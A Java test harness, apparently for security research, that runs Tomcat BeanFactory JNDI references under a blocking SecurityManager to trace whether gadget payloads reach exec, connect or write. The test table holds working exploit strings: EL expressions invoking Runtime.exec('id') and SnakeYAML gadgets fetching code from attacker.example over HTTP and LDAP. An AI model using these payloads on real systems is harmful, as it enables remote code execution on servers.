import javax.naming.*;
import javax.naming.spi.*;
import org.apache.naming.ResourceRef;

public class BFTrace2 {
    static volatile boolean execBlocked = false;

    public static void main(String[] args) throws Exception {
        // Install minimal SecurityManager to detect exec
        System.setSecurityManager(new SecurityManager() {
            public void checkExec(String cmd) {
                execBlocked = true;
                System.out.println("[SINK] checkExec: " + cmd);
                throw new SecurityException("blocked: exec " + cmd);
            }
            public void checkConnect(String h, int p) {
                System.out.println("[SINK] checkConnect: " + h + ":" + p);
                throw new SecurityException("blocked: connect");
            }
            public void checkWrite(String f) {
                System.out.println("[SINK] checkWrite: " + f);
                throw new SecurityException("blocked: write");
            }
            public void checkRead(String f) {}
            public void checkPermission(java.security.Permission p) {}
            public void checkPermission(java.security.Permission p, Object c) {}
        });

        String[][] tests = {
            // label, refClass, forceString, value
            {"EL_1plus1",       "javax.el.ELProcessor", "x=eval", "1+1"},
            {"EL_Runtime",      "javax.el.ELProcessor", "x=eval",
             "Runtime.getRuntime().exec('id')"},
            {"EL_reflection",   "javax.el.ELProcessor", "x=eval",
             "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')"},
            {"YAML_simple",     "org.yaml.snakeyaml.Yaml", "x=load", "hello: world"},
            {"YAML_exploit",    "org.yaml.snakeyaml.Yaml", "x=load",
             "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://attacker.example/x']]]]"},
            {"YAML_rowset",     "org.yaml.snakeyaml.Yaml", "x=load",
             "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://attacker.example/x', autoCommit: true}"},
        };

        for (String[] t : tests) {
            execBlocked = false;
            String label = t[0], refCls = t[1], fs = t[2], val = t[3];

            ResourceRef ref = new ResourceRef(refCls, null, "", "", true,
                "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", fs));
            ref.add(new StringRefAddr("x", val));

            Class<?> clz = Class.forName("org.apache.naming.factory.BeanFactory");
            ObjectFactory factory = (ObjectFactory) clz.getDeclaredConstructor().newInstance();

            System.out.println("\n=== " + label + " ===");
            try {
                Object result = factory.getObjectInstance(ref, new CompositeName("test"), null, null);
                System.out.println("  Result: " + (result != null ? result.getClass().getName() : "null"));
                System.out.println("  Exec blocked: " + execBlocked);
            } catch (Exception e) {
                System.out.println("  Exception: " + e.getClass().getSimpleName());
                System.out.println("  Message: " + e.getMessage());
                Throwable cause = e.getCause();
                while (cause != null) {
                    System.out.println("  Caused by: " + cause.getClass().getName() + ": " + cause.getMessage());
                    cause = cause.getCause();
                }
                System.out.println("  Exec blocked: " + execBlocked);
            }
        }
    }
}